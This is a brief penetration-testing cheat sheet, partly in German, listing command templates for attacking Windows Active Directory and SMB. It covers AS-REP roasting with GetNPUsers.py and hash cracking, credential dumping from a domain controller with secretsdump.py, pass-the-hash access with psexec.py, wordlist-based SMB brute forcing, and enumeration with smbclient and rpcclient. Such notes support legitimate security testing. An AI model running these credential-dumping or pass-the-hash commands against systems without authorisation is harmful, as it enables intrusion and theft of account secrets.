# Enum AD
`GetNPUsers.py -usersfile <user_list> -dc-ip <dc-ip> <domain>/`

Afterwards crack with john or oclhashcat

# Dumps Cred from DC
`secretsdump.py "<domain>/<user>:<pwd>"@<target-host>`

# Use Hash to access pc
`psexec.py -hashes <hash> <user>@<target-host>`

# Bruteforcing
https://digi.ninja/projects/cewl.php
User + Passwörter auf seite sammeln und dann mit MSFConsole --> scanner/smb/smb_login

# SMB
## Test users
`smbclient -L <server> -U <user>`

## Change password?
`smbpasswd -r <server> -U <user>`

## RPCClient - Info Gathering
`rpcclient -U <domain>\\<user> <client>`
